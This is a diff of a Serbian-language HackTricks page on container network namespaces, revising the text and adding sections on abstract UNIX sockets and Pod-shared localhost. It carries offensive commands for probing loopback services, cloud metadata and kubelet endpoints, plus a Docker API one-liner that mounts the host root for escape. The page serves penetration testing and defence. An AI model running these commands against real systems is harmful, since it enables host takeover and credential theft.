@@ -1,71 +1,78 @@
-# Mrežni namespace
+# Network Namespace
 
 {{#include ../../../../../banners/hacktricks-training.md}}
 
 ## Pregled
 
-Mrežni namespace izoluju resurse vezane za mrežu kao što su interfejsi, IP adrese, tabele rutiranja, ARP/neighbor stanje, firewall pravila, sockets i sadržaj fajlova poput `/proc/net`. Zato kontejner može imati ono što izgleda kao sopstveni `eth0`, sopstvene lokalne rute i sopstveni loopback uređaj bez posedovanja stvarnog mrežnog stacka hosta.
+Network namespace izoluje resurse povezane sa mrežom, kao što su interfejsi, IP adrese, routing tabele, ARP/neighbor stanje, firewall pravila, socket-i, apstraktni socket namespace UNIX domena i sadržaj fajlova kao što je `/proc/net`. Zbog toga container može imati ono što izgleda kao sopstveni `eth0`, sopstvene lokalne rute i sopstveni loopback uređaj, a da pritom ne poseduje stvarni network stack hosta.
 
-Sa stanovišta bezbednosti, ovo je važno jer izolacija mreže znači mnogo više od vezivanja portova. Privatni mrežni namespace ograničava šta workload može direktno da posmatra ili rekonfiguriše. Kada se taj namespace podeli sa hostom, kontejner može iznenada dobiti vidljivost u host listens, host-local servise i mrežne kontrolne tačke koje nikada nisu bile namenjene aplikaciji.
+Sa stanovišta bezbednosti, ovo je važno zato što se mrežna izolacija odnosi na mnogo više od bindovanja portova. Privatni network namespace ograničava šta workload može direktno da posmatra ili rekonfiguriše. Kada se taj namespace podeli sa hostom, container može iznenada dobiti vidljivost nad listener-ima na hostu, lokalnim servisima hosta, apstraktnim AF_UNIX endpoint-ima i tačkama za kontrolu mreže koje nikada nisu bile namenjene izlaganju aplikaciji.
 
-## Funkcionisanje
+## Operacija
 
-Novokreirani mrežni namespace počinje sa praznim ili gotovo praznim mrežnim okruženjem dok mu se ne prikače interfejsi. Runtime-i kontejnera potom kreiraju ili povezuju virtuelne interfejse, dodeljuju adrese i konfigurišu rute tako da aplikacija ima očekivanu konektivnost. U bridge-based deployments, to obično znači da kontejner vidi veth-backed interfejs povezan na host bridge. U Kubernetes, CNI plugins obavljaju ekvivalentno podešavanje za Pod networking.
+Novokreirani network namespace počinje sa praznim ili gotovo praznim mrežnim okruženjem sve dok mu se ne pripoje interfejsi. Container runtime-i zatim kreiraju ili povezuju virtualne interfejse, dodeljuju adrese i konfigurišu rute kako bi workload imao očekivanu konektivnost. U deployment-ima zasnovanim na bridge-u, to obično znači da container vidi interfejs zasnovan na veth-u, povezan sa bridge-om na hostu. U Kubernetes-u, CNI plugin-i obavljaju ekvivalentno podešavanje za Pod networking.
 
-Ova arhitektura objašnjava zašto je `--network=host` ili `hostNetwork: true` tako dramatična promena. Umesto da dobije pripremljen privatni mrežni stack, workload se pridružuje stvarnom mrežnom stacku hosta.
+Ova arhitektura objašnjava zašto su `--network=host` ili `hostNetwork: true` tako drastična promena. Umesto da dobije pripremljen privatni network stack, workload se pridružuje stvarnom network stack-u hosta.
 
 ## Lab
 
-Možete videti gotovo prazan mrežni namespace sa:
+Gotovo prazan network namespace možete videti pomoću:
 ```bash
 sudo unshare --net --fork bash
 ip addr
 ip route
 ```
-Možete uporediti normalne i host-networked kontejnere pomoću:
+A možete uporediti normalne kontejnere i kontejnere koji koriste host network sa:
 ```bash
 docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
 docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
 ```
-Kontejner koji koristi host network više nema sopstveni izolovani prikaz soketa i interfejsa. Sama ta promena je već značajna pre nego što uopšte pitate koje capabilities proces ima.
+Kontejner sa host mrežom više nema sopstveni izolovani prikaz socket-a i interfejsa. Sama ta promena je već značajna, čak i pre nego što proverite koje capabilities proces ima.
 
-## Runtime Usage
+## Upotreba runtime-a
 
-Docker i Podman obično kreiraju privatni network namespace za svaki kontejner, osim ako nije drugačije konfigurisan. Kubernetes obično daje svakom Pod-u sopstveni network namespace, koji je deljen između kontejnera unutar tog Poda ali odvojen od hosta. Incus/LXC sistemi takođe pružaju robusnu izolaciju zasnovanu na network namespace-ima, često sa većom raznovrsnošću virtuelnih mrežnih podešavanja.
+Docker i Podman obično kreiraju privatni network namespace za svaki kontejner, osim ako nisu drugačije konfigurisani. Kubernetes obično svakom Pod-u dodeljuje sopstveni network namespace, koji dele kontejneri unutar tog Pod-a, ali koji je odvojen od hosta. To znači da je `127.0.0.1` obično lokalni za Pod, a ne za kontejner: listener vezan samo za localhost u jednom kontejneru obično je dostupan njegovim sidecar i susednim kontejnerima. Incus/LXC sistemi takođe pružaju bogatu izolaciju zasnovanu na network namespace-ovima, često sa širim izborom virtuelnih mrežnih podešavanja.
 
-Uobičajeno načelo je da je privatno umrežavanje podrazumevana granica izolacije, dok je host networking eksplicitno odustajanje od te granice.
+Zajednički princip je da je privatno umrežavanje podrazumevana granica izolacije, dok je host umrežavanje eksplicitno isključivanje te granice.
 
-## Misconfigurations
+## Pogrešne konfiguracije
 
-Najvažnija pogrešna konfiguracija je jednostavno deljenje host network namespace-a. To se ponekad radi zbog performansi, niskonivovskog nadgledanja ili pogodnosti, ali uklanja jednu od najčistijih granica dostupnih kontejnerima. Slušači vezani za host postaju dostupniji direktnijim putem, localhost-only servisi mogu postati pristupačni, a capabilities kao što su `CAP_NET_ADMIN` ili `CAP_NET_RAW` postaju mnogo opasnije jer se operacije koje omogućavaju sada primenjuju na samo host mrežno okruženje.
+Najvažnija pogrešna konfiguracija je jednostavno deljenje host network namespace-a. To se ponekad radi zbog performansi, low-level monitoringa ili praktičnosti, ali se time uklanja jedna od najčistijih dostupnih granica između kontejnera. Listener-i dostupni na hostu postaju direktnije dostupni, servisi dostupni samo preko localhost-a mogu postati pristupačni, a capabilities kao što su `CAP_NET_ADMIN` ili `CAP_NET_RAW` postaju mnogo opasnije jer se operacije koje omogućavaju sada primenjuju na sopstveno mrežno okruženje hosta.
 
-Drugi problem je prekomerno dodeljivanje network-related capabilities čak i kada je network namespace privatan. Privatni namespace pomaže, ali ne čini raw sockets ili naprednu kontrolu mreže bezopasnim.
+Drugi problem je prekomerno dodeljivanje network-related capabilities čak i kada je network namespace privatan. Privatni namespace pomaže, ali ne čini raw socket-e ili naprednu kontrolu mreže bezopasnim.
 
-U Kubernetes-u, `hostNetwork: true` takođe menja koliko se možete osloniti na Pod-level network segmentation. Kubernetes dokumentuje da mnogi network plugin-ovi ne mogu ispravno razlikovati `hostNetwork` Pod traffic za `podSelector` / `namespaceSelector` matching i stoga ga tretiraju kao običan node traffic. Iz ugla napadača, to znači da kompromitovan `hostNetwork` workload često treba tretirati kao node-level network foothold, a ne kao normalan Pod i dalje ograničen istim pretpostavkama politike kao overlay-network workload-i.
+U Kubernetes-u, `hostNetwork: true` takođe menja koliko se možete osloniti na network segmentation na nivou Pod-a. Kubernetes navodi da mnogi network plugin-ovi ne mogu pravilno da razlikuju saobraćaj iz `hostNetwork` Pod-a pri `podSelector` / `namespaceSelector` uparivanju i zato ga tretiraju kao običan saobraćaj node-a. Iz ugla napadača, to znači da kompromitovani workload sa `hostNetwork` često treba tretirati kao network foothold na nivou node-a, a ne kao običan Pod koji je i dalje ograničen istim pretpostavkama policy-ja kao workload-i na overlay mreži.
 
-## Abuse
+## Zloupotreba
 
-U slabo izolovanim okruženjima, napadači mogu pregledati host listening services, doći do management endpoint-a vezanih samo za loopback, sniffovati ili ometati saobraćaj zavisno od tačnih capabilities i okruženja, ili rekonfigurisati routing i firewall stanje ako je prisutan `CAP_NET_ADMIN`. U klasteru, ovo takođe može olakšati lateralno kretanje i control-plane reconnaissance.
+U slabo izolovanim podešavanjima, napadači mogu pregledati listening servise hosta, pristupiti management endpoint-ima vezanim samo za loopback, prisluškivati saobraćaj ili ometati saobraćaj u zavisnosti od konkretnih capabilities i okruženja, ili promeniti routing i stanje firewall-a ako je prisutan `CAP_NET_ADMIN`. U cluster-u to takođe može olakšati lateral movement i reconnaissance control plane-a.
 
-Ako sumnjate na host networking, počnite potvrdom da vidljivi interfejsi i listener-i pripadaju hostu, a ne izolovanoj kontejnerskoj mreži:
+Ako sumnjate na host umrežavanje, počnite potvrđivanjem da vidljivi interfejsi i listener-i pripadaju hostu, a ne izolovanoj mreži kontejnera:
 ```bash
 ip addr
 ip route
 ss -lntup | head -n 50
 ```
-Servisi dostupni samo na loopback interfejsu često su prvo zanimljivo otkriće:
+Servisi dostupni samo preko loopback interfejsa često su prvo zanimljivo otkriće:
 ```bash
 ss -lntp | grep '127.0.0.1'
 curl -s http://127.0.0.1:2375/version 2>/dev/null
 curl -sk https://127.0.0.1:2376/version 2>/dev/null
 ```
-Ako su prisutne mrežne mogućnosti, testirajte da li workload može da pregleda ili izmeni vidljivi stack:
+Apstraktni UNIX socketi su još jedna meta koju je lako prevideti, jer su ograničeni opsegom mrežnog namespace-a, iako ne izgledaju kao TCP/UDP listeneri i možda ne postoje kao putanje u filesystemu ispod `/run`. Container sa host mrežom zato može naslediti pristup kontrolnim kanalima koji su dostupni samo hostu, a koji nikada nisu ni bind-mountovani u container:
+```bash
+ss -xap 2>/dev/null | head -n 50
+grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
+```
+Istorijski primer bila je greška u izlaganju apstraktnog socket-a `containerd-shim`, ali šira pouka je važnija od konkretnog CVE-a: kada se workload pridruži host network namespace-u, apstraktni AF_UNIX servisi takođe postaju deo attack surface-a. Ako ti socket-i deluju povezano sa runtime-om ili administracijom, pređi na [Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md).
+
+Ako su prisutne network capabilities, proveri da li workload može da pregleda ili menja vidljivi stack:
 ```bash
 capsh --print | grep -E 'cap_net_admin|cap_net_raw'
 iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
 ip link show
 ```
-Na modernim kernelima, host networking uz `CAP_NET_ADMIN` može takođe izložiti putanju paketa izvan jednostavnih promena `iptables` / `nftables`. `tc` qdiscs i filteri su takođe namespace-scoped, pa se u deljenom host network namespace-u primenjuju na host interfejse koje kontejner može videti. Ako je dodatno prisutan `CAP_BPF`, eBPF programi povezani sa mrežom, kao što su TC i XDP loaderi, takođe postaju relevantni:
+Na modernim kernelima, host networking zajedno sa `CAP_NET_ADMIN` može takođe da izloži putanju paketa izvan prostih izmena na `iptables` / `nftables`. `tc` qdiscs i filteri su takođe ograničeni na namespace, pa se u deljenom host network namespace-u primenjuju na host interfejse koje container može da vidi. Ako je dodatno prisutan i `CAP_BPF`, relevantni postaju i eBPF programi povezani sa mrežom, kao što su TC i XDP loaderi:
 ```bash
 capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
 for i in $(ls /sys/class/net 2>/dev/null); do
@@ -76,9 +83,9 @@ tc filter show dev "$i" egress 2>/dev/null
 done
 bpftool net 2>/dev/null
 ```
-Ovo je važno zato što napadač može da preslika, preusmeri, oblikuje ili odbaci saobraćaj na nivou host interfejsa, a ne samo da prepiše firewall rules. U privatnom network namespace-u te radnje su ograničene na prikaz containera; u deljenom host namespace-u postaju uticajne po host.
+Ovo je važno zato što napadač može da mirror-uje, preusmerava, oblikuje ili odbacuje saobraćaj na nivou interfejsa hosta, a ne samo da menja firewall rules. U privatnom network namespace-u te radnje su ograničene na prikaz kontejnera; u deljenom host namespace-u one utiču na host.
 
-U cluster ili cloud okruženjima, host networking takođe opravdava brzo lokalno izviđanje metapodataka i servisa povezanih sa control-plane-om:
+U cluster ili cloud okruženjima, host networking takođe opravdava brzi lokalni recon metadata servisa i servisa bliskih control plane-u:
 ```bash
 for u in \
 http://169.254.169.254/latest/meta-data/ \
@@ -87,11 +94,19 @@ http://127.0.0.1:10250/pods; do
 curl -m 2 -s "$u" 2>/dev/null | head
 done
 ```
-### Kompletan primer: Host networking + Local Runtime / Kubelet pristup
+U Kubernetes-u, imajte na umu da kompromitovanje **bilo kog** container-a u multi-container Pod-u takođe omogućava pristup localhost listener-ima koje su otvorili sibling container-i i sidecar-i, jer ceo Pod deli jedan network namespace. Ovo je naročito relevantno kod service-mesh, observability i helper container-a čiji su admin ili debug interfejsi namerno dostupni samo unutar Pod-a, a ne na nivou celog klastera:
+```bash
+ss -lntup | grep -E '127.0.0.1|::1'
+curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
+curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
+```
+Tretirajte „bound to localhost“ kao **Pod-private**, a ne kao **container-private**. Nakon što je jedan container u Pod-u kompromitovan, ta pretpostavka više ne važi.
 
-Host networking ne obezbeđuje automatski host root, ali često izlaže servise koji su namerno dostupni samo sa samog noda. Ako je jedan od tih servisa slabo zaštićen, host networking postaje direktan privilege-escalation path.
+### Potpuni primer: Host Networking + Local Runtime / Kubelet Access
 
-Docker API na localhost:
+Host networking ne obezbeđuje automatski root pristup hostu, ali često izlaže servise koji su namerno dostupni samo sa samog node-a. Ako je neki od tih servisa slabo zaštićen, host networking postaje direktan put za privilege-escalation.
+
+Docker API na localhost-u:
 ```bash
 curl -s http://127.0.0.1:2375/version 2>/dev/null
 docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
@@ -101,15 +116,15 @@ Kubelet na localhostu:
 curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
 curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
 ```
-Impact:
+Uticaj:
 
-- direktno kompromitovanje hosta ako je lokalni runtime API izložen bez odgovarajuće zaštite
-- izviđanje klastera ili lateralno kretanje ako je kubelet ili lokalni agenti dostupni
-- manipulacija saobraćajem ili denial of service kada se kombinuje sa `CAP_NET_ADMIN`
+- direktna kompromitacija hosta ako je lokalni runtime API izložen bez odgovarajuće zaštite
+- izviđanje clustera ili lateralno kretanje ako su kubelet ili lokalni agenti dostupni
+- manipulacija saobraćajem ili uskraćivanje usluge u kombinaciji sa `CAP_NET_ADMIN`
 
 ## Provere
 
-Cilj ovih provera je da se utvrdi da li proces ima privatni network stack, koje rute i listeners su vidljive, i da li mrežni prikaz već izgleda host-like pre nego što uopšte testirate capabilities.
+Cilj ovih provera je da utvrdite da li proces ima privatni network stack, koje su rute i listeneri vidljivi i da li prikaz mreže već izgleda kao na hostu pre nego što uopšte testirate capabilities.
 ```bash
 readlink /proc/self/ns/net   # Current network namespace identifier
 readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
@@ -118,19 +133,24 @@ ip netns identify $$ 2>/dev/null
 ip addr                      # Visible interfaces and addresses
 ip route                     # Routing table
 ss -lntup                    # Listening TCP/UDP sockets with process info
+ss -xap                      # UNIX sockets, including abstract namespace entries
+grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
 ```
-Zanimljivo ovde:
+Šta je ovde zanimljivo:
 
-- Ako `/proc/self/ns/net` i `/proc/1/ns/net` već izgledaju kao host, container možda deli host network namespace ili neki drugi neprivatan namespace.
-- `lsns -t net` i `ip netns identify` su korisni kada je shell već unutar imenovanog ili persistentnog namespace-a i želite da ga povežete sa `/run/netns` objektima sa host strane.
-- `ss -lntup` je posebno koristan jer otkriva slušače vezane samo za loopback i lokalne management endpoint-e.
-- Rute, nazivi interfejsa, firewall kontekst, `tc` stanje i eBPF attachment-i postaju mnogo važniji ako su prisutni `CAP_NET_ADMIN`, `CAP_NET_RAW` ili `CAP_BPF`.
-- U Kubernetesu, neuspeh rešavanja imena servisa iz `hostNetwork` Pod-a može jednostavno značiti da Pod ne koristi `dnsPolicy: ClusterFirstWithHostNet`, a ne da servis ne postoji.
+- Ako `/proc/self/ns/net` i `/proc/1/ns/net` već izgledaju kao host, kontejner možda deli host network namespace ili neki drugi namespace koji nije privatan.
+- `lsns -t net` i `ip netns identify` su korisni kada je shell već unutar imenovanog ili persistent namespace-a i želite da ga povežete sa objektima u `/run/netns` sa host strane.
+- `ss -lntup` je naročito vredan jer otkriva listenere ograničene samo na loopback i lokalne management endpointe. `ss -xap` i `/proc/net/unix` dodaju prikaz abstract socket-a koji uobičajene pretrage socket-a u filesystem-u ne obuhvataju.
+- Rute, nazivi interfejsa, firewall kontekst, `tc` stanje i eBPF attachments postaju mnogo važniji ako su prisutni `CAP_NET_ADMIN`, `CAP_NET_RAW` ili `CAP_BPF`.
+- U Kubernetes-u, neuspešna rezolucija service name-a iz `hostNetwork` Pod-a može jednostavno značiti da Pod ne koristi `dnsPolicy: ClusterFirstWithHostNet`, a ne da service ne postoji.
+- U multi-container Pod-ovima, localhost listeneri pripadaju celom Pod network namespace-u, zato proverite sidecar-e i sibling kontejnere pre nego što pretpostavite da je port ograničen samo na loopback i nedostupan iz kompromitovanog kontejnera.
 
-Kada pregledate container, uvek procenjujte network namespace zajedno sa skupom capabilities. Host networking u kombinaciji sa snažnim network capabilities predstavlja znatno drugačiji bezbednosni položaj od bridge networkinga sa ograničenim podrazumevanim skupom capabilities.
+Prilikom pregleda kontejnera, uvek procenite network namespace zajedno sa skupom capabilities. Host networking sa snažnim network capabilities je potpuno drugačiji security posture od bridge networking-a sa uskim podrazumevanim skupom capabilities.
 
-## References
+## Reference
 
-- [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
-- [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
+- [Kubernetes NetworkPolicy i `hostNetwork` napomene](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
+- [Linux `network_namespaces(7)` i izolacija abstract UNIX socket-a](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
+- [containerd advisory: abstract Unix domain socket-i izloženi host-network kontejnerima](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
+- [eBPF token i capability zahtevi za network-related eBPF programe](https://docs.ebpf.io/linux/concepts/token/)
 {{#include ../../../../../banners/hacktricks-training.md}}
